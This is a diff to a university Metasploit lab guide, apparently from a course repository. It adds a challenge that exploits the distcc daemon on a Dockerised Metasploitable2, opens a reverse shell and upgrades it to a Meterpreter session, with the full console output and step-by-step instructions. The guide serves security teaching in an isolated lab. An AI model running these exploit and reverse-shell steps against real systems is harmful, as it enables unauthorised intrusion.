@@ -1,5 +1,8 @@
 # <img src="https://www.tamusa.edu/brandguide/jpeglogos/tamusa_final_logo_bw1.jpg" width="100" height="50"> 
 # Metasploit II
+This lab can be performed on an e2-small GCP instance. However, performance degrades significantly with two or more Meterpreter shells. Options to improve performance include:
+1. Stop your GCP instance and edit Machine type to e2-medium. Resize the instance to e2-small or stop the instance after the lab is complete.
+2. Install Docker on a local Kali VM and complete the lab on a local Kali VM. Note, Kali is based on Debian, so use Debian instructions to install Docker Engine on Kali. Either of the following guides will work: [Install Docker Engine on Debian](https://docs.docker.com/engine/install/debian/) or [Installing Docker on Kali Linux](https://www.kali.org/docs/containers/installing-docker-on-kali/).
 
 ## Challenge 1: Deploy the Lab
 The following script prepares a custom Metasploitable2. Copy the script and run it or run the commands individually.
@@ -90,7 +93,7 @@ Exploit tomcat again, but recall that the RHOSTS must be the IP address discover
 **Capture a screenshot of the exploit against tomcat.**
 
 ### Challenge 5: Kill all Sessions
-Use the command sessions -K to kill all sessions.
+Use the command sessions -K to kill all sessions. Meterpreter sessions degrade performance in the lightweight GCP instances. Therefore, we will kill sessions that are no longer needed.
 
 ```
 msf6 exploit(multi/http/tomcat_mgr_upload) > sessions -K
@@ -100,3 +103,93 @@ msf6 exploit(multi/http/tomcat_mgr_upload) > sessions -K
 [*] 172.17.0.3 - Meterpreter session 1 closed.
 msf6 exploit(multi/http/tomcat_mgr_upload) > 
 ```
+
+### Challenge 6: Sessions
+Metasploit can simultaneously manage multiple active _sessions_. The **sessions** command is used to list, interact with, and kill sessions. Sessions can be standard shells, Meterpreter shells, or other types of command line interfaces with targets. We covered the basics of the **sessions** command, but advanced options can be very useful during a penetration test or other operational use of Metasploit. Additional reading can be found at [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/) and [Hacking Articles](https://www.hackingarticles.in/metasploit-for-pentester-sessions/).
+
+One feature that can be useful is the ability to upgrade a non-Meterpreter shell to a Meterpreter shell. The following example illustrates upgrading a Unix shell to a Meterpreter shell.
+
+```
+msf6 > search distcc
+
+Matching Modules
+================
+
+   #  Name                           Disclosure Date  Rank       Check  Description
+   -  ----                           ---------------  ----       -----  -----------
+   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec
+
+msf6 > use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_bash
+msf6 exploit(unix/misc/distcc_exec) > set rhosts 172.17.0.3
+rhosts => 172.17.0.3
+
+msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+
+msf6 exploit(unix/misc/distcc_exec) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP double handler on 172.17.0.2:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+msf6 exploit(unix/misc/distcc_exec) > [*] Command: echo LzhD0jeHdqJaNcwJ;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "LzhD0jeHdqJaNcwJ\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 2 opened (172.17.0.2:4444 -> 172.17.0.3:59870) at 2022-11-14 16:04:24 +0000
+
+msf6 exploit(unix/misc/distcc_exec) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  2         shell cmd/unix               172.17.0.2:4444 -> 172.17.0.3:59870 (
+                                         172.17.0.3)
+
+msf6 exploit(unix/misc/distcc_exec) > sessions -u 2
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]
+
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 172.17.0.2:4433 
+[*] Sending stage (1017704 bytes) to 172.17.0.3
+[*] Command stager progress: 100.00% (773/773 bytes)
+msf6 exploit(unix/misc/distcc_exec) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information          Connection
+  --  ----  ----                  -----------          ----------
+  2         shell cmd/unix                             172.17.0.2:4444 -> 172.
+                                                       17.0.3:59870 (172.17.0.
+                                                       3)
+  3         meterpreter x86/linu  daemon @ 172.17.0.3  172.17.0.2:4433 -> 172.
+            x                                          17.0.3:60874 (172.17.0.
+                                                       3)
+
+msf6 exploit(unix/misc/distcc_exec) >
+```
+
+Repeat the steps above. 
+1. Use **exploit/unix/misc/distcc_exec**
+2. Set payload to **cmd/unix/reverse**
+3. Set rhosts to target Metasploitable2
+4. Run the attack and backgound the resulting session with the command **run -j**
+5. Upgrade the session to a Meterpreter shell with command **sessions -u 2** (use the appropriate session number)
+
+**Capture a screenshot showing the cmd/unix and Meterpreter sessions on distcc.**
+
+### Challenge 7: Kill all Sessions
+The command was covered in Challenge 5.
